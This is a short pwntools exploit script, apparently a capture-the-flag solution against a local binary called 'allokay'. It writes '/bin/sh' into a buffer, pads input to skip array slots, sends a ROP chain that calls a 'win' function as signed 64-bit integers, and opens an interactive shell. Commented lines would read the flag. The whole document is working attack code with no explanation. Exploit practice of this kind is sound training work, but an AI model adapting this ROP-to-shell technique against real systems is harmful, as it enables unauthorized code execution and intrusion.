from pwn import *
import time

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF( 'allokay' )
p = elf.process()

rop = ROP( elf )
rop.call( elf.symbols.win, [elf.symbols.buffer+3] )
payload = rop.chain()

#p.recvuntil( '?\n' )
p.sendline( '14 /bin/sh\x00' )

#p.recvuntil( '!\n' )

p.sendline( '- ' * 11 )

for num in group( 8, payload ):
	p.sendline( str( u64( num, sign = True ) ) )

p.interactive()
#p.recvline()
#p.clean()
#p.sendline('cat flag; exit')
#log.success(p.readall())

